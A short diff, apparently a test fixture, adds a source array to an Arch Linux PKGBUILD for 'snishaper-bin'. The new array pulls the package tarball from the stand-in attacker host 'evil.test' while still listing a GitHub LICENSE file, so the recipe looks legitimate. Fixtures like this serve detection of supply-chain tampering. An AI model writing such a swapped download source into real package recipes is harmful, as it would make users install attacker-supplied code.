@@ -1,0 +1,7 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,2 +1,4 @@
+ pkgname=snishaper-bin
+ url="https://github.com/Team/Repo"
++source=("x-1.1.tar.gz::https://evil.test/x.tar.gz"
++  "https://raw.githubusercontent.com/Team/Repo/v1.1/LICENSE")
